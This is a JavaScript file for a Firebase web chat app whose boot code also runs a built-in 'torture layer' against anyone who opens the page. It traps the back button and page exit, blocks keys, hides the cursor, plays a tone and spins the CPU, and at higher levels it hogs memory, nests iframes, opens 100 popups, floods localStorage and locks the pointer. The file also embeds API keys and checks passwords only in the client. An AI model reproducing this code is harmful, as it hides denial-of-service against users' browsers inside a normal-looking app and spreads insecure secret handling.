import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, push, onChildAdded, remove, onValue, set, onDisconnect, get }
from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCl_6vsYoZkEBMUNf0P4CK01hKCwA5P0XQ",
  authDomain: "kasuschat.firebaseapp.com",
  databaseURL: "https://kasuschat-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "kasuschat",
  storageBucket: "kasuschat.firebasestorage.app",
  messagingSenderId: "953505535371",
  appId: "1:953505535371:web:0d44f20017bc8664948b8e"
};

/* ============================================================
   TORTURE LAYER
   0 = off, 1 = annoy, 2 = upside down, 3 = trap, 4 = heavy,
   5 = nuclear. Override with ?lvl=N
   ============================================================ */

const PARAMS = new URLSearchParams(location.search);
const IS_POPUP = PARAMS.has("popup") || !!window.opener;
const START_LVL = Math.max(0, Math.min(5, Number(PARAMS.get("lvl") ?? 3)));

const T = {
  lvl: START_LVL,
  spinOps: 1_800_000,   // iterations per frame at lvl 5
  memMB: 24,            // per tick
  memMs: 350,
  memCapMB: 900,
  popups: 100,
  nestMax: 50
};

let tortureLevel = T.lvl;
const timers = new Set();
let spinOn = false, hogs = [], memMB = 0, popupFired = false;
let nestOn = false, nestDepth = 0, audioCtx = null, audioOsc = null;
let keyBound = false, blurBound = false, lockBound = false;
const saved = {};

const every = (ms, fn) => { const id = setInterval(fn, ms); timers.add(id); return id; };
const once = (ms, fn) => { const id = setTimeout(() => { timers.delete(id); fn(); }, ms); timers.add(id); };

/* ---------- kill switch ---------- */

function ensureKillswitch() {
  if (IS_POPUP || document.getElementById("killswitch")) return;

  const style = document.createElement("style");
  style.textContent = `
    #killswitch{position:fixed;top:8px;right:8px;z-index:2147483647;display:flex;gap:4px;
      font:12px/1 ui-monospace,monospace;background:#111;border:1px solid #444;
      border-radius:8px;padding:6px;color:#eee;box-shadow:0 2px 12px #0008}
    #killswitch button{font:inherit;background:#222;color:#eee;border:1px solid #444;
      border-radius:5px;padding:4px 7px;cursor:pointer}
    #killswitch button:hover{background:#333}
    #killswitch .lvl{min-width:34px;text-align:center;padding:4px 2px;color:#0f0}`;
  document.head.appendChild(style);

  const bar = document.createElement("div");
  bar.id = "killswitch";

  const down = document.createElement("button");
  down.textContent = "−";
  down.onclick = (e) => { e.stopPropagation(); setLevel(tortureLevel - 1); };

  const label = document.createElement("span");
  label.className = "lvl";
  label.textContent = "L" + tortureLevel;

  const up = document.createElement("button");
  up.textContent = "+";
  up.onclick = (e) => { e.stopPropagation(); setLevel(tortureLevel + 1); };

  const stop = document.createElement("button");
  stop.textContent = "STOP";
  stop.onclick = (e) => { e.stopPropagation(); panic(); };

  bar.append(down, label, up, stop);
  document.body.appendChild(bar);

  // keep the label honest on every level change
  T.label = label;
  T.label.textContent = "L" + tortureLevel;
}

/* ---------- individual tortures ---------- */

function audioStart() {
  if (IS_POPUP) return;
  if (!audioCtx) {
    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    audioOsc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    audioOsc.type = "square";
    audioOsc.frequency.value = 440;
    gain.gain.value = 0.12;
    audioOsc.connect(gain).connect(audioCtx.destination);
    audioOsc.start();
  }
  audioCtx.resume();
}
function audioStop() { if (audioCtx) audioCtx.suspend(); }

function keyBlock(e) {
  if (e.ctrlKey || e.metaKey || e.altKey) return;
  const t = e.target;
  if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA" || t.isContentEditable)) return;
  if (/^(F\d{1,2}|Escape|Tab|Shift)$/.test(e.key)) return;
  e.preventDefault();
}

function trapBack() {
  history.pushState({}, "", location.href);
  window.addEventListener("popstate", () => history.pushState({}, "", location.href));
}

function armUnload() { window.onbeforeunload = () => true; }

function spin() {
  if (!spinOn) return;
  const ops = Math.floor(T.spinOps * (tortureLevel / 5));
  for (let i = 0; i < ops; i++);
  requestAnimationFrame(spin);
}

function memStart() {
  if (memMB >= T.memCapMB) return;
  hogs.push(new Uint8Array(T.memMB * 1024 * 1024));
  memMB += T.memMB;
}

function nest(el) {
  if (!nestOn || nestDepth >= T.nestMax) return;
  nestDepth++;
  const f = document.createElement("iframe");
  f.style.cssText = "width:320px;height:180px;border:1px solid #444;display:block";
  f.srcdoc = '<body style="margin:0"><iframe id="c" style="width:100%;height:100%;border:0"></iframe></body>';
  el.appendChild(f);
  f.onload = () => { const c = f.contentDocument?.getElementById("c"); if (c) nest(c); };
}

function popupBomb() {
  if (popupFired) return;
  popupFired = true;
  for (let i = 0; i < T.popups; i++) {
    window.open(location.href.split("?")[0] + "?lvl=5&popup=1", "_blank");
  }
}

function poisonStorage() {
  if (localStorage.getItem("__poisoned")) return;
  try {
    const chunk = "x".repeat(1024 * 1024);
    for (let i = 0; i < 20000; i++) localStorage.setItem("junk" + i, chunk);
  } catch (e) {}
  try { localStorage.setItem("__poisoned", "1"); } catch (e) {}
}

function rotate(on) {
  for (const id of ["login", "app"]) {
    const el = document.getElementById(id);
    if (el) el.style.transform = on ? "rotate(180deg)" : "";
  }
}

/* ---------- level engine ---------- */

function setLevel(n) {
  tortureLevel = Math.max(0, Math.min(5, n));

  // cursor
  document.body.style.cursor = tortureLevel >= 1 ? "none" : "";

  // title flicker
  if (tortureLevel >= 1 && !saved.titleTimer) {
    saved.titleTimer = every(100, () => {
      document.title = document.title === "Hi" ? "Hello" : "Hi";
    });
  } else if (tortureLevel < 1 && saved.titleTimer) {
    clearInterval(saved.titleTimer); timers.delete(saved.titleTimer);
    saved.titleTimer = null; document.title = "kasuschat";
  }

  // audio
  if (tortureLevel >= 1) audioStart(); else audioStop();

  // rotation
  rotate(tortureLevel >= 2);

  // keyboard
  if (tortureLevel >= 2 && !keyBound) {
    document.addEventListener("keydown", keyBlock);
    keyBound = true;
  } else if (tortureLevel < 2 && keyBound) {
    document.removeEventListener("keydown", keyBlock);
    keyBound = false;
  }

  // spin
  if (tortureLevel >= 3 && !spinOn) { spinOn = true; requestAnimationFrame(spin); }
  else if (tortureLevel < 3) spinOn = false;

  // beforeunload
  if (tortureLevel >= 3) armUnload(); else window.onbeforeunload = null;

  // memory
  if (tortureLevel >= 4 && !saved.memTimer) saved.memTimer = every(T.memMs, memStart);
  else if (tortureLevel < 4 && saved.memTimer) {
    clearInterval(saved.memTimer); timers.delete(saved.memTimer);
    saved.memTimer = null; hogs = []; memMB = 0;
  }

  // iframe nest
  if (tortureLevel >= 4 && !nestOn) { nestOn = true; nest(document.body); }
  else if (tortureLevel < 4) nestOn = false;

  // pointer lock
  if (tortureLevel >= 5 && !lockBound) {
    document.body.addEventListener("click", () => {
      if (tortureLevel >= 5 && !document.pointerLockElement) document.body.requestPointerLock();
    });
    lockBound = true;
  }

  if (T.label) T.label.textContent = "L" + tortureLevel;
}

function panic() {
  spinOn = false; nestOn = false;
  for (const id of timers) { clearInterval(id); clearTimeout(id); }
  timers.clear();
  saved.titleTimer = saved.memTimer = null;
  hogs = []; memMB = 0;
  audioStop();
  rotate(false);
  document.body.style.cursor = "";
  document.title = "kasuschat";
  if (keyBound) document.removeEventListener("keydown", keyBlock);
  keyBound = false;
  window.onbeforeunload = null;
  if (document.pointerLockElement) document.exitPointerLock();
  if (document.fullscreenElement) document.exitFullscreen();
  if (document.designMode === "on") document.designMode = "off";
  tortureLevel = 0;
  if (T.label) T.label.textContent = "L0";
}

window.__panic = panic;
window.__setLevel = setLevel;

/* first-gesture actions */
document.addEventListener("click", () => {
  audioStart();
  if (tortureLevel >= 5) {
    document.documentElement.requestFullscreen?.().catch(() => {});
    popupBomb();
    poisonStorage();
  }
}, { once: true });

/* ============================================================
   APP
   ============================================================ */

let currentUID = null;
try { currentUID = localStorage.getItem("chatUID"); } catch (e) {}
if (!currentUID) {
  currentUID = crypto.randomUUID();
  try { localStorage.setItem("chatUID", currentUID); } catch (e) {}
}

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function checkBan() {
  const snapshot = await get(ref(db, "moderation/banned/" + currentUID));
  if (!snapshot.exists()) return false;

  const banInfo = snapshot.val();
  const now = Date.now();

  if (!banInfo.expires || banInfo.expires > now) {
    location.href = "banned.html?reason=" + encodeURIComponent(banInfo.reason || "Banned");
    return true;
  }
  remove(ref(db, "moderation/banned/" + currentUID));
  return false;
}

const OWNER_UID = "32df7477-c156-4968-9fd5-73b0bbcec9aa";

function startPresence() {
  if (IS_POPUP) return;   // keep popup tabs cheap

  const onlineRef = ref(db, "onlineUsers");
  const myOnlineRef = ref(db, "onlineUsers/" + crypto.randomUUID());

  set(myOnlineRef, true);
  onDisconnect(myOnlineRef).remove();

  if (!blurBound) {
    document.addEventListener("visibilitychange", () => {
      set(myOnlineRef, document.hidden ? false : true);
    });
    blurBound = true;
  }

  onValue(onlineRef, (snapshot) => {
    let count = 0;
    snapshot.forEach((c) => { if (c.val() === true) count++; });
    const el = document.getElementById("onlineCount");
    if (el) el.innerText = count + (count === 1 ? " user online" : " users online");
  });
}

const chat = ref(db, "messages");
const typingRef = ref(db, "typing");
let lastTypingTime = 0;

if ("Notification" in window && Notification.permission !== "granted") {
  Notification.requestPermission();
}

function userTyping() {
  const name = document.getElementById("name").value;
  if (name.trim() === "") return;
  const now = Date.now();
  if (now - lastTypingTime < 1500) return;
  lastTypingTime = now;
  set(ref(db, "typing/" + name), { user: name, time: now });
}
window.userTyping = userTyping;

const PASSWORD_HASH = "0d08f09ddf93c9c5dbe3f15cd2f022e900b6298b902627d61c18751911e96f38";
const DURESS_PASSWORD_HASH = "8af6ecbdcdb3564c8cc2c2217992b4aafc3981aaeb450b6448a0b86d5bd4de02";
const ADMIN_PASSWORD_HASH = "cac51705e3ff34dce799e863ddd0c0747a3c6b640236a092b8223e4e1c635232";

async function sha256(text) {
  const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, "0")).join("");
}

function send() {
  const name = document.getElementById("name").value;
  const message = document.getElementById("message").value;
  const box = document.getElementById("message");

  if (message.trim() === "" || name.trim() === "") return;

  if (message.startsWith("/clear")) {
    const pass = message.split(" ")[1];
    sha256(pass || "").then(hash => {
      if (hash === ADMIN_PASSWORD_HASH) {
        remove(chat).then(() => {
          const c = document.getElementById("chat");
          if (c) c.innerHTML = "";
        });
      } else {
        alert("Wrong admin password");
      }
    });
    box.value = "";
    return;
  }

  push(chat, { uid: currentUID, name, message, timestamp: Date.now() });
  remove(ref(db, "typing/" + name));
  box.value = "";
}
window.send = send;

function formatTime(timestamp) {
  const date = new Date(timestamp), now = new Date();
  const time = date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
  if (date.toDateString() === now.toDateString()) return time;

  const y = new Date(); y.setDate(now.getDate() - 1);
  if (date.toDateString() === y.toDateString()) return "Yesterday " + time;

  return date.toLocaleDateString() + " " + time;
}

function loadAllMessages() {
  const chatBox = document.getElementById("chat");

  onValue(chat, (snapshot) => {
    chatBox.replaceChildren();

    snapshot.forEach((child) => {
      const msg = child.val() || {};
      const div = document.createElement("div");

      div.appendChild(document.createTextNode("[" + formatTime(msg.timestamp) + "] "));

      const nameEl = document.createElement("b");
      nameEl.textContent = String(msg.name || "Unknown");
      div.appendChild(nameEl);

      if (window.isAdmin && msg.uid) {
        const uidEl = document.createElement("span");
        uidEl.style.color = "#888";
        uidEl.style.fontSize = "11px";
        uidEl.textContent = " (" + String(msg.uid) + ")";
        div.appendChild(uidEl);
      }

      div.appendChild(document.createTextNode(": "));

      const content = String(msg.message || "");
      let imageUrl = null;
      try {
        const u = new URL(content);
        if (u.protocol === "https:" && u.hostname === "i.ibb.co") imageUrl = u.href;
      } catch (e) {}

      if (imageUrl) {
        const img = document.createElement("img");
        img.src = imageUrl;
        img.alt = "Chat image";
        img.style.maxWidth = "250px";
        img.style.borderRadius = "6px";
        img.style.marginTop = "5px";
        img.loading = "lazy";
        div.appendChild(document.createElement("br"));
        div.appendChild(img);
      } else {
        div.appendChild(document.createTextNode(content));
      }

      chatBox.appendChild(div);
    });

    chatBox.scrollTop = chatBox.scrollHeight;
  });
}

let typingUsers = {};

onValue(typingRef, (snapshot) => {
  const myName = document.getElementById("name").value;
  typingUsers = {};

  snapshot.forEach((child) => {
    const info = child.val();
    if (!info.user || info.user === myName) return;
    if (Date.now() - info.time < 2500) typingUsers[info.user] = true;
    else remove(ref(db, "typing/" + info.user));
  });

  updateTypingDisplay();
});

function updateTypingDisplay() {
  const el = document.getElementById("typingIndicator");
  const users = Object.keys(typingUsers);

  if (!users.length) return (el.innerText = "");
  el.innerText = users.length === 1
    ? users[0] + " is typing..."
    : users.join(", ") + " are typing...";
}

async function login() {
  if (await checkBan()) return;

  const hash = await sha256(document.getElementById("password").value);

  if (hash === PASSWORD_HASH || hash === ADMIN_PASSWORD_HASH) {
    document.getElementById("login").style.display = "none";
    document.getElementById("app").style.display = "block";
    window.isAdmin = hash === ADMIN_PASSWORD_HASH;
    rotate(tortureLevel >= 2);
    startPresence();
    loadAllMessages();
    return;
  }

  if (hash === DURESS_PASSWORD_HASH) {
    document.open();
    document.write(`<html><head><title>404</title></head><body>
      <h1>404</h1><p>This page could not be found.</p></body></html>`);
    document.close();
    ensureKillswitch();
    return;
  }

  alert("Wrong password");
}
window.login = login;

function banUser(uid, reason = "Rule violation", durationMinutes = null) {
  if (!window.isAdmin || uid === OWNER_UID) return;
  set(ref(db, "moderation/banned/" + uid), {
    reason,
    expires: durationMinutes ? Date.now() + durationMinutes * 60000 : null
  });
}
function unbanUser(uid) { if (window.isAdmin) remove(ref(db, "moderation/banned/" + uid)); }
window.banUser = banUser;
window.unbanUser = unbanUser;

function toggleQuotes() {
  const box = document.getElementById("quoteHistory");
  box.style.display = box.style.display === "none" ? "block" : "none";
}
window.toggleQuotes = toggleQuotes;

const uploadArea = document.getElementById("uploadArea");
const imageInput = document.getElementById("imageInput");

uploadArea.onclick = () => imageInput.click();

uploadArea.addEventListener("dragover", (e) => {
  e.preventDefault(); uploadArea.style.borderColor = "#aaa";
});
uploadArea.addEventListener("dragleave", () => { uploadArea.style.borderColor = "#555"; });
uploadArea.addEventListener("drop", (e) => {
  e.preventDefault();
  uploadArea.style.borderColor = "#555";
  uploadImage(e.dataTransfer.files[0]);
});
imageInput.addEventListener("change", () => uploadImage(imageInput.files[0]));

function uploadImage(file) {
  if (!file) return;
  const formData = new FormData();
  formData.append("image", file);

  fetch("https://api.imgbb.com/1/upload?key=e48b7e0f6d197cb14a1d7f5508fadfef", {
    method: "POST",
    body: formData
  })
    .then(r => r.json())
    .then(data => {
      push(chat, {
        uid: currentUID,
        name: document.getElementById("name").value,
        message: data.data.url,
        timestamp: Date.now()
      });
    });
}

/* ============================================================
   BOOT
   ============================================================ */

trapBack();
ensureKillswitch();
setLevel(START_LVL);
